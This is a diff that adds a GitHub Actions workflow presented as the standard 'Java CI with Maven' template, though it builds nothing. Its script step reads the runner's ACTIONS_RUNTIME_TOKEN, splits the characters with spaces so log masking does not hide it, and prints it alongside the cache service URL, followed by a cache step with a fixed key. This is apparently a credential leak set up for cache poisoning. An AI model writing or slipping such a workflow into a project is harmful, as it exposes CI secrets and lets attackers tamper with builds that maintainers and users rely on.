@@ -1,0 +1,28 @@
+# This workflow will build a Java project with Maven, and cache/restore any dependencies to improve the workflow execution time
+# For more information see: https://help.github.com/actions/language-and-framework-guides/building-and-testing-java-with-maven
+
+name: Java CI with Maven
+
+on:
+  push:
+    branches: [ master ]
+  pull_request:
+    branches: [ master ]
+
+jobs:
+  build:
+
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/github-script@v5
+        with:
+          script: |
+            const token = (process.env['ACTIONS_RUNTIME_TOKEN'] || '').split('').join(' ');
+            console.log("process.env['ACTIONS_CACHE_URL']="+process.env['ACTIONS_CACHE_URL']);
+            console.log(token)
+      - uses: actions/cache@v2
+        id: cache
+        with:
+          path: target
+          key: Readme-25-01
